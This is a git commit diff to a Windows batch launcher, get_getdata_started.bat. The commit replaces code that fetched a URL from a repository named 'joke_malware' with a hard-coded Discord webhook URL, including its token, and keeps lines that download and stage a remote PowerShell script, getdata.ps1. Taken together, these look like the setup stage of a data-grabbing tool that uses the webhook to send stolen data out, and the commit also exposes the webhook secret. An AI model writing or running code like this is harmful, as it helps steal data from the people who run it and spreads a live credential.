96e36fc271d7126180d8394e609353e323ffa5ce
thompog <thomaseduard@hotmail.com>
2026-04-10 19:06:36 +0200

    Comment out URL fetching and set static webhook

--- get_getdata_started.bat
+++ get_getdata_started.bat
@@ -1,10 +1,10 @@
 @echo off
-if not exist "%~dp0url.txt" (
-  curl -L "https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt" -o "url.txt"
-)
-for /F %%i in (url.txt) do set url=%%i
-del url.txt
-echo %url%>discord_webhook.txt
+::if not exist "%~dp0url.txt" (
+::  curl -L "https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt" -o "url.txt"
+::)
+::for /F %%i in (url.txt) do set url=%%i
+::del url.txt
+echo https://discord.com/api/webhooks/1491073066145677542/NlYoNlDnzPxXh4T3_QzmobOlqGoyw5G3g7HUiaIQa4VL5TM4r2XpyZnZ0Qh4WWocWarz>discord_webhook.txt
 if not exist "%~dp0getdata.ps1" (
   curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "getdata.ps1"
 )
